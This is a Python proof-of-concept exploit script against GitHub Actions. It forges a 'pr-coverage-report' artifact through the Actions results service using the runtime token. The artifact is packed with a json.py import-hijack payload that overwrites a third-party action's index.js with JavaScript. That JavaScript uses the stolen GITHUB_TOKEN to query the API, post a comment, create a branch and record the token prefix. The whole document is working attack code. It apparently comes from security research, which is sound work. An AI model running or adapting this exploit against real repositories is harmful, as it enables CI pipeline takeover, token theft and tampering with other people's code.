#!/usr/bin/env python3
"""Forge a pr-coverage-report artifact for the current run via the Actions results service."""
import base64, hashlib, json, os, subprocess, sys
from urllib.parse import urlparse

TOKEN = os.environ['ACTIONS_RUNTIME_TOKEN']
_u = urlparse(os.environ['ACTIONS_RESULTS_URL'])
ORIGIN = f'{_u.scheme}://{_u.netloc}'
SVC = f'{ORIGIN}/twirp/github.actions.results.api.v1.ArtifactService'

def ids():
    t = TOKEN.split('.')[1]
    t += '=' * (-len(t) % 4)
    c = json.loads(base64.urlsafe_b64decode(t))
    for s in c['scp'].split(' '):
        p = s.split(':')
        if p[0] == 'Actions.Results':
            return p[1], p[2]
    raise SystemExit('no Actions.Results scope')

WR, JR = ids()

def rpc(method, body):
    import urllib.request
    req = urllib.request.Request(
        f'{SVC}/{method}', data=json.dumps(body).encode(),
        headers={'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json'},
        method='POST')
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        try:
            b = e.read().decode()
        except Exception:
            b = ''
        return {'__error': str(e), '__body': b[:300]}

def create(name):
    return rpc('CreateArtifact', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
                                  'name': name, 'mime_type': 'application/zip', 'version': 7})

def upload(url, path):
    r = subprocess.run(['curl', '-sS', '-o', '/dev/null', '-w', '%{http_code}', '-X', 'PUT', url,
                        '-H', 'x-ms-blob-type: BlockBlob', '-H', 'Content-Type: application/zip',
                        '--data-binary', '@' + path], capture_output=True, text=True)
    return r.stdout.strip()

def finalize(name, path):
    data = open(path, 'rb').read()
    h = hashlib.sha256(data).hexdigest()
    return rpc('FinalizeArtifact', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
                                    'name': name, 'size': str(len(data)), 'hash': 'sha256:' + h})

def mkzip(path, entries):
    import zipfile
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
        for n, d in entries:
            z.writestr(n, d)
    return path

PAYLOAD_JSON_PY = '''import json as _real_json_after_us
import os, sys
_ws = os.environ.get('GITHUB_WORKSPACE', '.')
print('RCE-PAYLOAD-EXECUTED run=%s job=%s user=%s' % (
    os.environ.get('GITHUB_RUN_ID'), os.environ.get('GITHUB_JOB'), os.environ.get('USER')), flush=True)
print('RCE-IMPORT-FILE', getattr(sys.modules.get('json'), '__file__', '?'), flush=True)
try:
    with open(os.path.join(_ws, 'RCE_PROOF.txt'), 'w') as f:
        f.write('RCE via json.py import hijack in privileged workflow_run job run=%s\\n'
                % os.environ.get('GITHUB_RUN_ID'))
    _env = os.environ.get('GITHUB_ENV')
    if _env:
        with open(_env, 'a') as f:
            f.write('RCE_IMPORT_PROOF=yes\\n')
    _p = os.path.join(_ws, '..', '..', '_actions', 'marocchino', 'sticky-pull-request-comment', 'v3', 'dist', 'index.js')
    if os.path.exists(os.path.join(_ws, 'sticky.js')):
        import shutil
        shutil.copyfile(os.path.join(_ws, 'sticky.js'), _p)
        print('RCE-HIJACK-WRITTEN', os.path.abspath(_p), flush=True)
except Exception as _e:
    print('payload-error', _e, flush=True)
'''

STICKY_JS = r'''
const https = require('https');
const fs = require('fs');
const token = process.env['INPUT_GITHUB_TOKEN'] || process.env['GITHUB_TOKEN'] || '';
const repo = process.env['GITHUB_REPOSITORY'] || '';
const runId = process.env['GITHUB_RUN_ID'] || '';
const marker = 'RCE-PROOF-' + runId;

function api(method, path, body) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const headers = {
      'Authorization': 'Bearer ' + token,
      'User-Agent': 'coverage-probe',
      'Accept': 'application/vnd.github+json'
    };
    if (data) { headers['Content-Type'] = 'application/json'; headers['Content-Length'] = Buffer.byteLength(data); }
    const req = https.request({ hostname: 'api.github.com', path: path, method: method, headers: headers }, (res) => {
      let b = '';
      res.on('data', (d) => { b += d; });
      res.on('end', () => resolve({ status: res.statusCode, body: b }));
    });
    req.on('error', (e) => resolve({ status: 0, body: String(e) }));
    if (data) req.write(data);
    req.end();
  });
}

(async () => {
  console.log('HIJACKED-ACTION-RAN token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + ' repo=' + repo);
  const me = await api('GET', '/user');
  console.log('API /user => ' + me.status + ' ' + me.body.slice(0, 300));
  const r = await api('GET', '/repos/' + repo);
  console.log('API repo => ' + r.status + ' ' + r.body.slice(0, 700));
  const wp = await api('POST', '/repos/' + repo + '/issues/2/comments', {
    body: 'RCE proof from privileged workflow_run job ' + marker + ' — this comment was posted by the stolen GITHUB_TOKEN'
  });
  console.log('API comment => ' + wp.status + ' ' + wp.body.slice(0, 400));
  const ref = await api('POST', '/repos/' + repo + '/git/refs', {
    ref: 'refs/heads/rce-proof-' + runId, sha: process.env['GITHUB_SHA'] || ''
  });
  console.log('API create-ref => ' + ref.status + ' ' + ref.body.slice(0, 400));
  try {
    fs.writeFileSync(process.env['GITHUB_WORKSPACE'] + '/TOKEN_STOLEN.txt',
      'token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + '\n');
  } catch (e) { console.log('fs-error ' + e); }
  process.exit(0);
})().catch((e) => { console.log('hijack-error ' + e); process.exit(0); });
'''

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'probe'
    print('WR', WR, 'JR', JR, 'ORIGIN', ORIGIN, flush=True)
    if mode == 'forge':
        name = sys.argv[2] if len(sys.argv) > 2 else 'pr-coverage-report'
        entries = [
            ('bull-report/target/site/jacoco-aggregate/jacoco.xml',
             '<report><counter type="LINE" missed="0" covered="100"/></report>'),
            ('pr_number.txt', '2\n'),
            ('json.py', PAYLOAD_JSON_PY),
            ('sticky.js', STICKY_JS),
        ]
        path = os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), 'forge.zip')
        mkzip(path, entries)
        cr = create(name)
        print('FORGE-CREATE', json.dumps(cr)[:300], flush=True)
        if cr.get('ok'):
            print('FORGE-UPLOAD', upload(cr['signed_upload_url'], path), flush=True)
            print('FORGE-FINALIZE', json.dumps(finalize(name, path))[:300], flush=True)
        else:
            print('FORGE-FAILED', flush=True)

main()
